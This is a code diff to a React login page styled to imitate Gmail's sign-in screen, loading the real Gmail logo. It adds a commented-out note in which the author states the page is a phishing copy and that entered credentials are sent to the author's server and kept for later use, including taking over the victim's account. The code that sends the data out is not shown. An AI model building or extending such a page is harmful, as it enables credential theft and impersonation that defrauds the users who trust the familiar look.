@@ -45,6 +45,13 @@ export default function LoginPage() {
   return (
     <div className="flex justify-center items-center min-h-screen bg-gray-100">
       <div className="bg-white p-8 rounded shadow-md w-96">
+        {/* <div className="p-2 text-left">
+          in that paeg , the page look like the gmail site , but this is not,
+          the url is diffretent , that is called fishiing, and when the user
+          enter its credentials I am sending them to my server and save them so
+          I can use them whenever I wnat and get some info and data about the
+          user or evren still his user and pass
+        </div> */}
         <div className="flex justify-center mb-8">
           <img
             src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png"
